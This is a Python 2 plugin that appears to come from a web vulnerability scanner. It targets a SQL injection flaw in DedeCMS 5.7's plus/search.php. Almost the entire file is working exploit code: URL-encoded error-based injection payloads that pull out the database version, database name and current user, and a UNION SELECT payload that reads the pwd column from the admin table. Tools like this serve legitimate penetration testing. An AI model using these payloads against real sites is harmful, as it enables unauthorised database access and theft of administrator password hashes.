#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *
import re

def run_domain(http,ob):
    list = []

    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        expurl="%s%s"%(url,"plus/search.php?typeArr[1%20or%20@%60%27%60%3D1%20and%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28Select%20%28version%28%29%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%20and%20@%60%27%60%3D0]=11&&kwtype=0&q=1111&searchtype=title")
        res, content = requestUrl(http,expurl,ob['task_id'],ob['domain_id'])
        if content.find('Error infos:')>=0:
            request = getRequest(expurl)
            response = getResponse(res)
            if ob['isstart']=='1':
                version_name,database_name,current_user_name=audit(http,url)
                if version_name!="" or database_name!="" or current_user_name!="":
                    
                    if version_name!="":
                        version_name="数据库库版本：%s\n"%version_name[1:]
                    if  database_name!="":
                        database_name="数据库名称：%s\n"%database_name[1:]
                    if  current_user_name!="":
                        current_user_name="本地用户：%s\n"%current_user_name[1:]
                    detail="%s验证性扫描结果：\n%s%s%s"%(detail,version_name,database_name,current_user_name)
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
        else:
            print "=============="
            expurl1="%s%s"%(url,"plus/search.php?keyword=as&typeArr[111%3D@%60\%27%60%29+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,md5(333),12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+%60%23@__admin%60%23@%60\%27%60+]=a")
            print expurl1
            r, c = requestUrl(http,expurl1,ob['task_id'],ob['domain_id'])
            print c
            if c.find("310dcbbf4cce62f762a2aaa148d556bd")>=0:
                request = getRequest(expurl1)
                response = getResponse(res)
                    
                list.append(getRecord(ob,ob['scheme']+"://"+ob['domain']+ob['base_path'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:dedecmsv57sqlinjection.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:dedecmsv57sqlinjection.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def 
def audit(http,url):
    version_name=''
    database_name=''
    current_user_name=''
    try:
        
        version_url="plus/search.php?typeArr[1%20or%20@%60%27%60%3D1%20and%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28Select%20%28version%28%29%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%20and%20@%60%27%60%3D0]=11&&kwtype=0&q=1111&searchtype=title"
        database_url='plus/search.php?typeArr[1%20or%20@%60%27%60%3D1%20and%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28Select%20%28database%28%29%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%20and%20@%60%27%60%3D0]=11&&kwtype=0&q=1111&searchtype=title'
        current_user_url='plus/search.php?typeArr[1%20or%20@%60%27%60%3D1%20and%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28Select%20%28user%28%29%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%20and%20@%60%27%60%3D0]=11&&kwtype=0&q=1111&searchtype=title'
#       r,c=http.request("%s%s"%(url,version_url))
        r,c=yx_httplib2_request(http,"%s%s"%(url,version_url))

        m=re.search(r'Duplicate entry \'(.+?)\' for key',c,re.I)
        if m:
            version_name=m.group(1)
        
#       r1,c1=http.request("%s%s"%(url,database_url))
        r1,c1=yx_httplib2_request(http,"%s%s"%(url,database_url)) 

        m1=re.search(r'Duplicate entry \'(.+?)\' for key',c1,re.I)
        if m1:
            database_name=m1.group(1)
            
            
#       r2,c2=http.request("%s%s"%(url,current_user_url))
        r2,c2=yx_httplib2_request(http,"%s%s"%(url,current_user_url))

        m2=re.search(r'Duplicate entry \'(.+?)\' for key',c2,re.I)
        if m2:
            current_user_name=m2.group(1)
    except Exception,e:
        logging.getLogger().error("File:dedecmsv57sqlinjection.py, audit function"+str(e))
    return version_name,database_name,current_user_name
        
        
        
        
        
        
        